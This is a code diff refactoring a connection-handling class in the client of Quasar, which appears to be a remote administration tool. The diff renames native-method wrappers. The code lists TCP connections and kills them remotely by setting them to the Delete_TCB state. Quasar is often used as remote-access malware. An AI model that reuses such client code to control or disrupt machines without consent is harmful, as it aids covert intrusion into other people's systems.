@@ -1,8 +1,4 @@
-﻿using Quasar.Client.Utilities;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
-using Quasar.Common.Networking;
+﻿using Quasar.Common;
 using System;
 using System.Runtime.InteropServices;
 
@@ -77,32 +73,32 @@ namespace Quasar.Client.Messages
                     table[i].state = (byte)ConnectionState.Delete_TCB;
                     var ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(table[i]));
                     Marshal.StructureToPtr(table[i], ptr, false);
-                    NativeMethods.SetTcpEntry(ptr);
+                    Win32.SetTcpEntry(ptr);
                     Execute(client, new GetConnections());
                     return;
                 }
             }
         }
 
-        private NativeMethods.MibTcprowOwnerPid[] GetTable()
+        private Win32.MibTcprowOwnerPid[] GetTable()
         {
-            NativeMethods.MibTcprowOwnerPid[] tTable;
+            Win32.MibTcprowOwnerPid[] tTable;
             var afInet = 2;
             var buffSize = 0;
             // retrieve correct pTcpTable size
-            NativeMethods.GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, afInet, NativeMethods.TcpTableClass.TcpTableOwnerPidAll);
+            Win32.GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, afInet, Win32.TcpTableClass.TcpTableOwnerPidAll);
             var buffTable = Marshal.AllocHGlobal(buffSize);
             try
             {
-                var ret = NativeMethods.GetExtendedTcpTable(buffTable, ref buffSize, true, afInet, NativeMethods.TcpTableClass.TcpTableOwnerPidAll);
+                var ret = Win32.GetExtendedTcpTable(buffTable, ref buffSize, true, afInet, Win32.TcpTableClass.TcpTableOwnerPidAll);
                 if (ret != 0)
                     return null;
-                var tab = (NativeMethods.MibTcptableOwnerPid)Marshal.PtrToStructure(buffTable, typeof(NativeMethods.MibTcptableOwnerPid));
+                var tab = (Win32.MibTcptableOwnerPid)Marshal.PtrToStructure(buffTable, typeof(Win32.MibTcptableOwnerPid));
                 var rowPtr = (IntPtr)((long)buffTable + Marshal.SizeOf(tab.dwNumEntries));
-                tTable = new NativeMethods.MibTcprowOwnerPid[tab.dwNumEntries];
+                tTable = new Win32.MibTcprowOwnerPid[tab.dwNumEntries];
                 for (var i = 0; i < tab.dwNumEntries; i++)
                 {
-                    var tcpRow = (NativeMethods.MibTcprowOwnerPid)Marshal.PtrToStructure(rowPtr, typeof(NativeMethods.MibTcprowOwnerPid));
+                    var tcpRow = (Win32.MibTcprowOwnerPid)Marshal.PtrToStructure(rowPtr, typeof(Win32.MibTcprowOwnerPid));
                     tTable[i] = tcpRow;
                     rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(tcpRow));
                 }
